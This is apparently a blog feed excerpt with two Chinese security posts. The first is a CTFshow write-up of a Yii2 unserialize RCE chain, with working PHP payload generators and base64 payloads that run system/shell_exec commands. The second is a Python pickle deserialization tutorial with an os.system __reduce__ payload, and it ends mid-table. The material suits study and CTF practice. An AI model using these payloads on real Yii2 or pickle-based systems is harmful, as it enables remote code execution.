的命名空间和特质的特性</p>\n<h2 id=\"漏洞描述\"><a class=\"anchor\" href=\"#漏洞描述\">#</a> 漏洞描述</h2>\n<p>yii2.2.0.38 之前的版本存在反序列化漏洞，程序在调用 unserialize 时，我们可以通过构造特定的 payload 来进行 rce</p>\n<h2 id=\"环境搭建\"><a class=\"anchor\" href=\"#环境搭建\">#</a> 环境搭建</h2>\n<p>选择的版本是 2.0.37<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3lpaXNvZnQveWlpMi9yZWxlYXNlcy90YWcvMi4wLjM3\">Release 2.0.37 · yiisoft/yii2 · GitHub</span></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202303082128415.png\" alt=\"image-20230308212823338\" /></p>\n<p>在 config/web.php 文件的 cookieValidationKey 为一个值（这个值为一个随机的值就可以了，不然会报错 狗头.jpg）</p>\n<p>在文件中有一个 yii 文件</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202303091010504.png\" alt=\"image-20230309101038399\" /></p>\n<p>运行这个文件就可以开启这个服务</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202303091015862.png\" alt=\"image-20230309101540820\" /></p>\n<p>访问给的这个地址</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202303091017019.png\" alt=\"image-20230309101720932\" /></p>\n<p>到此，一个简单的复现环境就搭建好了</p>\n<h2 id=\"漏洞复现2037\"><a class=\"anchor\" href=\"#漏洞复现2037\">#</a> 漏洞复现 2.0.37</h2>\n<p>环境搭建好了就开始构造利用</p>\n<h3 id=\"知识点\"><a class=\"anchor\" href=\"#知识点\">#</a> 知识点</h3>\n<p>这里主要简单记录一下以前写笔记时没有记录到的知识点</p>\n<h4 id=\"命名空间\"><a class=\"anchor\" href=\"#命名空间\">#</a> 命名空间</h4>\n<p>PHP 的命名空间是一种用于解决命名冲突问题的技术。它可以让开发者在同一个程序中使用相同的类名、函数名或常量名，而不会发生命名冲突的问题。</p>\n<p><code>空间成员</code> ：这里空间成员是指空间所影响的（只影响类，函数，常量）</p>\n<p>空间成员的访问：</p>\n<p>一个 php 文件中，第一个空间的定义义必须放在第 1 行。如果所要定义的空间已存在，则是进入空间</p>\n<pre><code class=\"language-php\">&lt;?php\nnamespace app;\n\nfunction test()&#123;\n    echo 1;\n&#125;\ntest();//app\\test()\nnamespace app\\assets;\n\nfunction test()&#123;\n    echo 2;\n&#125;\n\ntest();//app\\assets\\test()\n</code></pre>\n<p>在 PHP 中，命名空间可以通过关键字  <code>namespace</code>  来定义。例如，下面的代码定义了命名空间  <code>MyNamespace</code> ：</p>\n<pre><code class=\"language-php\">namespace MyNamespace;\n\nclass MyClass &#123;\n    // class definition\n&#125;\n</code></pre>\n<p>在定义了命名空间之后，我们可以使用完全限定名称（Fully Qualified Name）来访问该命名空间中的类、函数或常量。例如，如果要访问上面定义的  <code>MyClass</code>  类，可以使用以下代码：</p>\n<pre><code class=\"language-php\">$obj = new \\MyNamespace\\MyClass();\n</code></pre>\n<p>在上面的代码中， <code>\\</code>  表示根命名空间，因此  <code>\\MyNamespace\\MyClass</code>  表示完全限定名称。</p>\n<p><code>引入空间成员</code> :</p>\n<p>use 空间名 \\ 空间名 【as 别名】：将指定空间引入到当前空间。同可以使用 as 关键字为被引入的空间起个别名。</p>\n<p>use 空间名 \\ 空间名 \\ 成员类 【as 别名】：将指定的空间中的成员引入到当前空间，引入空间成员只能引入类。</p>\n<h4 id=\"路由\"><a class=\"anchor\" href=\"#路由\">#</a> 路由</h4>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202303091043533.png\" alt=\"image-20230309104343460\" /></p>\n<p>这里可以看一下日志，可以看到所有的用户请求都是发送给入口脚本  <code>index.php</code>  来处理的。那么，开发者需要一种高效的判断请求应当采用哪个 controller 哪个 action 进行处理的方法。</p>\n<p>这里并不像是像有些网站那种 https://www.cnblogs.com/LQ-Joker/p/16102371.html 一是过于冗长，二是易出错且难排查，三是日后修改起来容易有遗漏，yii 提供了路由和 URL 管理的组件路由是指 URL 中用于标识用于处理用户请求的 module, controller, action 的部分，一般情况下由  <code>r</code>  查询参数来指定。如 <code>http://www.digpage.com/index.php?r=post/view&amp;id=100</code>  ，表示这个请求将由 PostController 的 actionView 来处理。</p>\n<p>更多的可以膜拜一下上面路由原理教程</p>\n<h3 id=\"复现\"><a class=\"anchor\" href=\"#复现\">#</a> 复现</h3>\n<p>我们利用的是反序列化漏洞，所以我们需要构建一个反序列化的入口</p>\n<p>在 Controllers 下面创建一个 TestController 文件</p>\n<pre><code class=\"language-php\">&lt;?php\n\nnamespace app\\controllers;\n\nclass TestController extends \\yii\\web\\Controller\n&#123;\n    public function actionTest($data)\n    &#123;\n        return unserialize(base64_decode($data));\n    &#125;\n\n&#125;\n</code></pre>\n<p>漏洞利用点， <code>basic/vendor/yiisoft/yii2/db/BatchQueryResult.php</code>  这个文件下</p>\n<pre><code class=\"language-php\">    public function __destruct()\n    &#123;\n        // make sure cursor is closed\n        $this-&gt;reset();\n    &#125;\n\n    /**\n     * Resets the batch query.\n     * This method will clean up the existing batch query so that a new batch query can be performed.\n     */\n    public function reset()\n    &#123;\n        if ($this-&gt;_dataReader !== null) &#123;\n            $this-&gt;_dataReader-&gt;close();\n        &#125;\n        $this-&gt;_dataReader = null;\n        $this-&gt;_batch = null;\n        $this-&gt;_value = null;\n        $this-&gt;_key = null;\n    &#125;\n</code></pre>\n<p>这里有一个__destruct 函数，通过反序列化会自动调用这个函数，跟到下一步 reset ()，这里只有一个 close 可以跟进</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202303092047714.png\" alt=\"image-20230309204712681\" /></p>\n<p>这里继续跟进</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202303092048710.png\" alt=\"image-20230309204809681\" /></p>\n<p>没有发现可以利用的点，这里可以控制 $this-&gt;_dataReader，使用一个别的类中没有的参数，可以触发 <code>__call</code>  方法来进行利用。__call 函数的当调用一个不存在或者不可调用的方法的时候会自动调用，全局收索一下，那些地方有__call 函数可以利用，在 <code>basic/vendor/fzaninotto/faker/src/Faker/Generator.php</code>  这个文件下</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202303092034885.png\" alt=\"image-20230309203444834\" /></p>\n<p>至于为什么选用这个函数，我们再进一步，查看 format 函数</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202303092035551.png\" alt=\"image-20230309203513523\" /></p>\n<p>这里有一个回调函数，如果里面的参数可控这里就可以直接利用了</p>\n<pre><code class=\"language-perl\">call_user_func_array(callable $callback, array $param_arr): mixed \ncallback\n    被调用的回调函数。\nparam_arr\n    要被传入回调函数的数组，这个数组得是索引数组。\n    \nfunction a($b, $c) &#123;  \n    echo $b; \n\techo $c; \n&#125; \ncall_user_func_array('a', array(&quot;111&quot;, &quot;222&quot;)); \n//输出 111 222\n</code></pre>\n<p>接着跟进 getFormatter 函数</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202303092040954.png\" alt=\"image-20230309204059909\" /></p>\n<p>在第一个 if 语句就可以看到，这里对上面回调函数中的第一个参数是可控的，后一个参数这个函数写为空值了</p>\n<p>这里需要一个类，可以命令执行，这里看到师傅们用的是 call_user_func</p>\n<p>这里全局找一下带有 call_user_func 的类，这里找到两个参数可控的类</p>\n<p><code>basic/vendor/yiisoft/yii2/rest/IndexAction.php</code></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202303092133955.png\" alt=\"image-20230309213304905\" /></p>\n<p><code>basic/vendor/yiisoft/yii2/rest/CreateAction.php</code></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202303092133649.png\" alt=\"image-20230309213342624\" /></p>\n<p>这两个类都可以使用，pop 链还是比较好构造的</p>\n<pre><code class=\"language-perl\">yii\\db\\BatchQueryResult::__destruct()-&gt;reset()-&gt;close()\n↓↓↓\nFake\\Generator::__call()-&gt;format()-&gt;call_user_func_array\n↓↓↓\nyii\\rest\\IndexAction::run()-&gt;call_user_func\n</code></pre>\n<p>Payload：</p>\n<pre><code class=\"language-php\">&lt;?php\nnamespace yii\\rest&#123;\n    class IndexAction&#123;\n        public $checkAccess=&quot;phpinfo&quot;; //调用的函数\n        public $id=&quot;1&quot;;\t\t\t//函数中的参数\n    &#125;\n&#125;\n\nnamespace Faker&#123;\n    use yii\\rest\\IndexAction;\n\n    class Generator&#123;\n        protected $formatters;\n        public function __construct()\n        &#123;\n            $this-&gt;formatters['close'] = [new IndexAction(),'run'];\n        &#125;\n    &#125;\n&#125;\n\nnamespace yii\\db&#123;\n    use Faker\\Generator;\n\n    class BatchQueryResult&#123;\n        private $_dataReader;\n        public function __construct()\n        &#123;\n            $this-&gt;_dataReader = new Generator();\n        &#125;\n    &#125;\n\n&#125;\n\nnamespace &#123;\n\n    use yii\\db\\BatchQueryResult;\n\n    echo base64_encode(serialize(new BatchQueryResult()));\n&#125;\n//TzoyMzoieWlpXGRiXEJhdGNoUXVlcnlSZXN1bHQiOjE6e3M6MzY6IgB5aWlcZGJcQmF0Y2hRdWVyeVJlc3VsdABfZGF0YVJlYWRlciI7TzoxNToiRmFrZXJcR2VuZXJhdG9yIjoxOntzOjEzOiIAKgBmb3JtYXR0ZXJzIjthOjE6e3M6NToiY2xvc2UiO2E6Mjp7aTowO086MjA6InlpaVxyZXN0XEluZGV4QWN0aW9uIjoyOntzOjExOiJjaGVja0FjY2VzcyI7czo3OiJwaHBpbmZvIjtzOjI6ImlkIjtzOjE6IjEiO31pOjE7czozOiJydW4iO319fX0=\n</code></pre>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202303100053418.png\" alt=\"image-20230310005338299\" /></p>\n<p>成功执行 phpinfo，执行一个 ping <span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5iYWlkdS5jb20=\">www.baidu.com</span></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202303100055463.png\" alt=\"image-20230310005515376\" /></p>\n<h3 id=\"其他pop链\"><a class=\"anchor\" href=\"#其他pop链\">#</a> 其他 pop 链</h3>\n<p>看到师傅利用别的函数也有 pop 链，学习记录一下</p>\n<p>链子的起点还是 <code>basic/vendor/yiisoft/yii2/db/BatchQueryResult.php</code>  这个文件下的__destruct 函数，这个 pop 中没有再啊利用 call 魔术方法，而是找到了一个本来就有的 close 函数来实现命令执行，找到的利用函数在 <code>basic/vendor/yiisoft/yii2/web/DbSession.php</code>  这里</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202303100111573.png\" alt=\"image-20230310011115526\" /></p>\n<p>这个函数下面的 composeFields 可以利用</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202303100111531.png\" alt=\"image-20230310011105476\" /></p>\n<p>call_user_func 这个函数中的参数也是可控的</p>\n<p>pop:</p>\n<pre><code class=\"language-perl\">yii\\db\\BatchQueryResult::__destruct()-&gt;reset()-&gt;close()\n↓↓↓\nyii\\web\\DbSession::close()-&gt;composeFields()-&gt;call_user_func()\n↓↓↓\nyii\\rest\\IndexAction::run()-&gt;call_user_func()\n\n</code></pre>\n<pre><code class=\"language-php\">&lt;?php\nnamespace yii\\rest&#123;\n    class IndexAction&#123;\n        public $checkAccess=&quot;system&quot;;\n        public $id=&quot;ping www.baidu.com&quot;;\n    &#125;\n&#125;\n\nnamespace yii\\web&#123;\n    use yii\\rest\\IndexAction;\n    class DbSession&#123;\n        public $writeCallback;\n        public function __construct()&#123;\n            $this-&gt;writeCallback = [new IndexAction(),'run'];\n        &#125;\n        \n    &#125;\n&#125;\n\nnamespace yii\\db&#123;\n    use yii\\web\\DbSession;\n\n    class BatchQueryResult&#123;\n        private $_dataReader;\n        public function __construct()\n        &#123;\n            $this-&gt;_dataReader = new DbSession();\n        &#125;\n    &#125;\n\n&#125;\n\nnamespace &#123;\n    use yii\\db\\BatchQueryResult;\n    echo base64_encode(serialize(new BatchQueryResult()));\n&#125;\n//TzoyMzoieWlpXGRiXEJhdGNoUXVlcnlSZXN1bHQiOjE6e3M6MzY6IgB5aWlcZGJcQmF0Y2hRdWVyeVJlc3VsdABfZGF0YVJlYWRlciI7TzoxNzoieWlpXHdlYlxEYlNlc3Npb24iOjE6e3M6MTM6IndyaXRlQ2FsbGJhY2siO2E6Mjp7aTowO086MjA6InlpaVxyZXN0XEluZGV4QWN0aW9uIjoyOntzOjExOiJjaGVja0FjY2VzcyI7czo2OiJzeXN0ZW0iO3M6MjoiaWQiO3M6MTg6InBpbmcgd3d3LmJhaWR1LmNvbSI7fWk6MTtzOjM6InJ1biI7fX19\n</code></pre>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202303100126159.png\" alt=\"image-20230310012647055\" /></p>\n<p>也是测试成功</p>\n<h2 id=\"web267\"><a class=\"anchor\" href=\"#web267\">#</a> web267</h2>\n<p>这里存在弱口令，admin、admin</p>\n<p>登录后在 about 的源码中有提示</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202303100959022.png\" alt=\"image-20230310095940986\" /></p>\n<p>get 传入 view-source</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202303101000342.png\" alt=\"image-20230310100033303\" /></p>\n<p>这里找到了反序列化的入口，用上面的 poc 直接打就行（这里入口 r=backdoor/shell）</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202303101003194.png\" alt=\"image-20230310100348135\" /></p>\n<h2 id=\"web268-270\"><a class=\"anchor\" href=\"#web268-270\">#</a> web268-270</h2>\n<pre><code class=\"language-php\">&lt;?php\nnamespace yii\\rest &#123;\n    class Action\n    &#123;\n        public $checkAccess;\n    &#125;\n    class IndexAction\n    &#123;\n        public function __construct($func, $param)\n        &#123;\n            $this-&gt;checkAccess = $func;\n            $this-&gt;id = $param;\n        &#125;\n    &#125;\n&#125;\nnamespace yii\\web &#123;\n    abstract class MultiFieldSession\n    &#123;\n        public $writeCallback;\n    &#125;\n    class DbSession extends MultiFieldSession\n    &#123;\n        public function __construct($func, $param)\n        &#123;\n            $this-&gt;writeCallback = [new \\yii\\rest\\IndexAction($func, $param), &quot;run&quot;];\n        &#125;\n    &#125;\n&#125;\nnamespace yii\\db &#123;\n    use yii\\base\\BaseObject;\n    class BatchQueryResult\n    &#123;\n        private $_dataReader;\n        public function __construct($func, $param)\n        &#123;\n            $this-&gt;_dataReader = new \\yii\\web\\DbSession($func, $param);\n        &#125;\n    &#125;\n&#125;\nnamespace &#123;\n    $exp = new \\yii\\db\\BatchQueryResult('shell_exec', 'cp /f* 1.txt'); //此处写命令\n    echo(base64_encode(serialize($exp)));\n&#125;\n\n</code></pre>\n<p>换一个链子就行</p>\n",
            "tags": [
                "CTFshow",
                "yii反序列化"
            ]
        },
        {
            "id": "https://blog.xcu.icu/2023/03/08/python%E7%9A%84%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/",
            "url": "https://blog.xcu.icu/2023/03/08/python%E7%9A%84%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/",
            "title": "python的序列化和反序列化",
            "date_published": "2023-03-07T16:00:00.000Z",
            "content_html": "<h2 id=\"python的序列化和反序列化\"><a class=\"anchor\" href=\"#python的序列化和反序列化\">#</a> python 的序列化和反序列化</h2>\n<p>​\t程序运行的过程中，所有对象都是在内存中操作的，当程序一旦执行完毕，对象占有的内存会被收回，如果我们想重复调用这些对象就需要将这些对象持久化储存到内存中，下次运行的时候直接读取相关数据，我们将对象从内存中变成可以持久化储存的数据的过程称为序列化</p>\n<h3 id=\"可序列化的对象\"><a class=\"anchor\" href=\"#可序列化的对象\">#</a> 可序列化的对象</h3>\n<ul>\n<li>整数、浮点数、复数</li>\n<li>str、byte、bytearray</li>\n<li>只包含可封存对象的集合，包括 tuple、list、set 和 dict</li>\n<li>定义在模块最外层的函数（使用 def 定义，lambda 函数则不可以）</li>\n<li>定义在模块最外层的内置函数</li>\n<li>定义在模块最外层的类</li>\n<li>None、True 和 False</li>\n</ul>\n<h2 id=\"pickle库和函数\"><a class=\"anchor\" href=\"#pickle库和函数\">#</a> pickle 库和函数</h2>\n<p>pickle 是 python 语言的一个标准模块，实现了基本数据的序列化和反序列化<br />\n dumps\t将对象反序列化为 bytes 对象<br />\n dump\t将对象反序列化到文件对象，存入文件</p>\n<p>loads\t对 bytes 对象进行反序列化<br />\n load\t通过对象反序列化，从文件中读取数据</p>\n<p>首先通过几个例子来看一下几个函数的作用</p>\n<p>dump/load</p>\n<pre><code class=\"language-bash\">#序列化\npickle.dump(obj, file, protocol=None,)\nobj表示要进行封装的对象(必填参数）\nfile表示obj要写入的文件对象\n以二进制可写模式打开即wb(必填参数）\n#反序列化\npickle.load(file, *, fix_imports=True, encoding=&quot;ASCII&quot;, errors=&quot;strict&quot;, buffers=None)\nfile文件中读取封存后的对象\n以二进制可读模式打开即rb(必填参数)\n</code></pre>\n<pre><code class=\"language-python\">import pickle\nimport pickletools\nimport os\n\nclass test(object):\n    def __init__(self):\n        self.value1='abc1'\n        self.value2='abc2'\n\nx=test()\nfile=open('1.txt','wb')\ny=pickle.dump(x,file)\nprint(file)\nfile.close()\nfile1=open('1.txt','rb')\nz=pickle.load(file1)\nprint(z)\n</code></pre>\n<pre><code class=\"language-bash\">#序列化\npickle.dumps(obj, protocol=None,*,fix_imports=True)\ndumps()方法不需要写入文件中，直接返回一个序列化的bytes对象。\n#反序列化\npickle.loads(bytes_object, *,fix_imports=True, encoding=&quot;ASCII&quot;. errors=&quot;strict&quot;)\nloads()方法是直接从bytes对象中读取序列化的信息，而非从文件中读取。\n</code></pre>\n<pre><code class=\"language-python\">import pickle\nimport pickletools\nimport os\n\nclass test(object):\n    def __init__(self):\n        self.value1='a'\n        self.value2='b'\n\nx=test()\ny=pickle.dumps(x)\nprint(y)\nz=pickle.loads(y)\nprint(z)\n</code></pre>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220820152155604.png\" alt=\"image-20220820152155604\" /></p>\n<p>从上面两个例子可以知道 python 怎么实现序列化和反序列的操作，接下来记录序列化后的字符串是的含义</p>\n<h2 id=\"pvm\"><a class=\"anchor\" href=\"#pvm\">#</a> PVM</h2>\n<p>Python 是一个名为解释器的软件包，解释器是可以让程序运行起来的一套程序，具有独立性，当我们运行一个 python 程序的时候会执行两个步骤</p>\n<ol>\n<li>先将将源码编译成字节码（字节码是 python 特有的一种表现形式，需要进一步编译才能被机器执行，如果 python 进程在主机上面有写入权限，那么它会吧程序字节码保存为一个.pyc 为扩展名的文件，如果没用则在内存中生成字节码在程序执行结束后被自动抛弃）</li>\n<li>python 程序将编译好的字节码转发到 PVM（python 虚拟机）中，PVM 会循环迭代执行字节码码指令</li>\n</ol>\n<p>(<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0cxMDExL2FydGljbGUvZGV0YWlscy8xMDI5MDg4ODY=\">https://blog.csdn.net/G1011/article/details/102908886</span>)</p>\n<h2 id=\"pvm和pickle的关系\"><a class=\"anchor\" href=\"#pvm和pickle的关系\">#</a> PVM 和 Pickle 的关系</h2>\n<p>pickle 是一门基于栈的编程语言，有不同的编程方式，其本质就是一个轻量级的 PVM</p>\n<p>这个轻量级的 PVM 由三部分组成及功能：</p>\n<p>指令处理器：</p>\n<pre><code>从数据流中读取操作码和参数，并对其进行解释处理，之时处理器会循环这个过程，不断改变栈区（stack）和标签区（memo）区域的值，知道遇到.结束。这时最终停留在栈顶的值将会被作为反序列化对象返回\n</code></pre>\n<p>栈区（stack）：</p>\n<pre><code>由python的列表（list）实现，作为流数据处理过程中的暂存区，在不断的进出栈过程中完成对数据流的反序列化操作，并最终在栈顶生成反序列化的结果\n</code></pre>\n<p>标签区（memo）：</p>\n<pre><code>由python的字典（dict）实现，可以看作是数据索引或者标记，为PVM的整个生命周期提供储存功能\n</code></pre>\n<h3 id=\"python2\"><a class=\"anchor\" href=\"#python2\">#</a> python2</h3>\n<p>几个比较重要的操作码：</p>\n<pre><code>c: 读取本行的内容作为模块名（module）, 读取下一行的内容作为对象名object，然后将 module.object作为可调用对象压入到栈中\n(: 将一个标记对象压入到栈中 , 用于确定命令执行的位置 . 该标记常常搭配 t 指令一起使用 , 以便产生一个元组\nS: 后面跟字符串 , PVM会读取引号中的内容 , 直到遇见换行符 , 然后将读取到的内容压入到栈中\nt: 从栈中不断弹出数据 , 弹射顺序与压栈时相同 , 直到弹出左括号 . 此时弹出的内容形成了一个元组 , 然后 , 该元组会被压入栈中\nR: 将之前压入栈中的元组和可调用对象全部弹出 , 然后将该元组作为可调用对象的参数并执行该对象 。最后将结果压入到栈中\n.: 结束整个 Pickle反序列化过程\n</code></pre>\n<pre><code>ccopy_reg \t\t\t#引入copy_reg模块\n_reconstructor \t\t#引入_reconstructor对象\np0 \t\t\t\t\t#p:将栈顶数据(copy_reg._reconstructor)存储在memo中，0是编号\n(c__main__ \t\t\t#引入__main__模块\ntest\t\t\t\t#引入test对象\np1\t\t\t\t\t#将栈顶数据(__main__.test)存储在memo中，1是编号\nc__builtin__\t\t#引入__builtin__模块\nobject\t\t\t\t#引入object对象\np2\t\t\t\t\t#将栈顶数据(__builtin__.object)存储在memo中，2是编号\nNtp3\t\t\t\t#依次从栈中弹出数据直到(，此时弹出的数据组成一个元组，最后将该元组入栈\nRp4\t\t\t\t\t#将元组和可调用对象全部弹出并执行，将结果压入栈顶，然后将栈顶数据存储在memo中\n\t\t\t\t\t#这里便完成了所有需要的模块和类对象的调用\n(dp5\t\t\t\t#在栈顶创建一个字典，将memo中的内容转换成键值对并存储在这个字典中\n\t\t\t\t\t#然后栈顶(这个字典)存储在memo中，5是编号\nS'value2'\t\t\t#创建字符串'value2'\np6\t\t\t\t\t#存储在memo中\nS'b'\t\t\t\t#创建字符串’b‘\np7\t\t\t\t\t#存储在memo中\nsS'value1'\t\t\t#s:将'value2':'b'作为键值对添加到字典中，创建字符串'value1'\np8\t\t\t\t\t#存储在memo中\nS'a'\t\t\t\t#创建字符串'a'\np9\t\t\t\t\t#存储在memo中\nsb.\t\t\t\t\t#将'value1':'a'作为键值对添加到字典中,b:调用setstate或者dic.update()更新字典内容\n\t\t\t\t\t#读取到.结束pickle序列化过程\n</code></pre>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9kb2NzLnB5dGhvbi5vcmcvMi9saWJyYXJ5L2NvcHlfcmVnLmh0bWw=\">copy_reg</span> 模块，提供了在 pickle 或是 copy 特定对象时，可以运行一个指定的函数，作为对象的构造器</p>\n<h3 id=\"python3\"><a class=\"anchor\" href=\"#python3\">#</a> python3</h3>\n<p>python 运行结果与 python2 不同，这里只有 picpletools</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220820163443278.png\" alt=\"image-20220820163443278\" /></p>\n<p>0x80：机器看到这个操作符，立刻再去字符串读取一个字节，得到 x04。解释为 “这是一个依据 4 号协议序列化的字符串”，这个操作结束。<br />\n\\x8c：创建（引入）对象</p>\n<p>)：向栈中压入一个空数组<br />\n \\x81：从栈空间弹出一个类和参数，并用这个参数实例化这个弹出来的类，最终把实例化的类再次压回栈中。<br />\n}：压入一个空的字典<br />\n (：向栈中压入一个 MARK 标记<br />\n X/V：实例化一个字符串<br />\n u：以键值对的形式进行数据组合（组合的数据为当前栈空间位置到上一个 MARK 之间的数据），并全部添加或更新到该 MARK 之前的一个字典中<br />\n b：利用填充好的字典和实例化好的对象进行属性赋值。<br />\n. STOP 简单易懂，结束序列化。</p>\n<h2 id=\"pickle反序列化漏洞分析\"><a class=\"anchor\" href=\"#pickle反序列化漏洞分析\">#</a> pickle 反序列化漏洞分析</h2>\n<p>常见 python 反序列化漏洞出现在__educe__() 魔法函数上，这个函数与 PHP 中的__wakeup（）魔术方法类似，都是因为每当反序列化时自动调用</p>\n<pre><code class=\"language-python\">import pickle\nimport os\nimport pickletools\n\nclass test(object):\n    def __init__(self):\n        self.value1='abc1'\n        self.value2='abc2'\n\n    def __reduce__(self):\n        ls=&quot;dir&quot;\n        return (os.system,(ls,))\n\nuser = test()\ny = pickle.dumps(user)\ny = pickletools.optimize(y)\nprint(y)\n</code></pre>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220820162806423.png\" alt=\"image-20220820162806423\" /></p>\n<pre><code class=\"language-python\">import pickle\npayload=b'\\x80\\x04\\x95\\x15\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x8c\\x02nt\\x8c\\x06system\\x93\\x8c\\x03dir\\x85R.'\npickle.loads(payload)\n</code></pre>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220820162837675.png\" alt=\"image-20220820162837675\" /></p>\n<p>这里成功执行了系统命令</p>\n<h2 id=\"opcode\"><a class=\"anchor\" href=\"#opcode\">#</a> opcode</h2>\n<p>如果需要一次执行多个函数，那么 opcode 尤为重要</p>\n<table>\n<thead>\n<tr>\n<th>opcode</th>\n<th>描述</th>\n<th>具体写法</th>\n<th>栈上的变化</th>\n<th>memo 上的变化</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>c</td>\n<td>获取一个全局对象或 import 一个模块（注：会调用 import 语句，能够引入新的包）</td>\n<td>c[module]\\n[instance]\\n</td>\n<td>获得的对象入栈</td>\n<td>无</td>\n</tr>\n<tr>\n<td>o</td>\n<td>寻找栈中的上一个 MARK，以之间的第一个数据（必须为函数）为 callable，第二个到第 n 个数据为参数，执行该函数（或实例化一个对象）</td>\n<td>o</td>\n<td>这个过程中涉及到的数据都出栈，函数的返回值（或生成的对象）入栈</td>\n<td>无</td>\n</tr>\n<tr>\n<td>i</td>\n<td>相当于 c 和 o 的组合，先获取一个全局函数，然后寻找栈中的上一个 MARK，并组合之间的数据为元组，以该元组为参数执行全局函数（或实例化一个对象）</td>\n<td>i[module]\\n[callable]\\n</td>\n<td>这个过程中涉及到的数据都出栈，函数返回值（或生成的对象）入栈</td>\n<td>无</td>\n</tr>\n<tr>\n<td>N</td>\n<td>实例化一个 None</td>\n<td>N</td>\n<td>获得的对象入栈</td>\n<td>无</td>\n</tr>\n<tr>\n<td>S</td>\n<td>实例化一个字符串对象</td>\n<td>S'xxx'\\n（也可以使用双引号、' 等 python 字符串形式）</td>\n<td>获得的对象入栈</td>\n<td>无</td>\n</tr>\n<tr>\n<td>V</td>\n<td>实例化一个 UNICODE 字符串对象</td>\n<td>Vxxx\\n</td>\n<td>获得的对象入栈</td>\n<td>无</td>\n</tr>\n<tr>\n<td>I</td>\n<td>实例化一个 int 对象</td>\n<td>Ixxx\\n</td>\n<td>获得的对象入栈</td>\n<td>无</td>\n</tr>\n<tr>\n<td>F</td>\n<td>实例化一个 float 对象</td>\n<td>Fx.x\\n</td>\n<td>获得的对象入栈</td>\n<td>无</td>\n</tr>\n<tr>\n<td>R</td>\n<td>选择栈上的第一个对象作为函数、第二个对象作为参数（第二个对象必须为元组），然后调用该函数</td>\n<td>R</td>\n<td>函数和参数出栈，函数的返回值入栈</td>\n<td>无</td>\n</tr>\n<tr>\n<td>.</td>\n<td>程序结束，栈顶的一个元素作为 pickle.loads () 的返回值</td>\n<td>.</td>\n<td>无</td>\n<td>无</td>\n</tr>\n<tr>\n<td>(</td>\n<td>向栈中压入一个 MARK 标记</td>\n<td>(</td>\n<td>MARK 标记入栈</td>\n<td>无</td>\n</tr>\n<tr>\n<td>t</td>\n<td>寻找栈中的上一个 MARK，并组合之间的数据为元组</td>\n<td>t</td>\n<td>MARK 标记以及被组合的数据出栈，获得的对象入栈</td>\n<td>无</td>\n</tr>\n<tr>\n<td>)</td>\n<td>向栈中直接压入一个空元组</td>\n<td>)</td>\n<td>空元组入栈</td>\n<td>无</td>\n</tr>\n<tr>\n<td>l</td>\n<td>寻找栈中的上一个 MARK，并组合之间的数据为列表</td>\n<td>l</td>\n<td>MARK 标记以及被组合的数据出栈，获得的对象入栈</td>\n<td>无</td>\n</tr>\n<tr>\n<td>]</td>\n<td>向栈中直接压入一个空列表</td>\n<td>]</td>\n<td>空列表入栈</td>\n<td>无</td>\n</tr>\n<tr>\n<td>d</td>\n<td>寻找栈中的上一个 MARK，并组合之间的数据为字典（数据必须有偶数个，即呈 key-value 对）</td>\n<td>d</td>\n<td>MARK 标记以及被组合的数据出栈，获得的对象入栈</td>\n<td>无</td>\n</tr>\n<tr>\n<td>}</td>\n<td>向栈中直接压入一个空字典</td>\n<td>}</td>\n<td>空字典入栈</td>\n<td>无</td>\n</tr>\n<tr>\n<td>p</td>\n<td>将栈顶对象储存至 memo_n</td>\n<td>pn\\n</td>\n<td>无</td>\n<td>对象被储存</td>\n</tr>\n<tr>\n<td>g</td>\n<td>将 memo_n 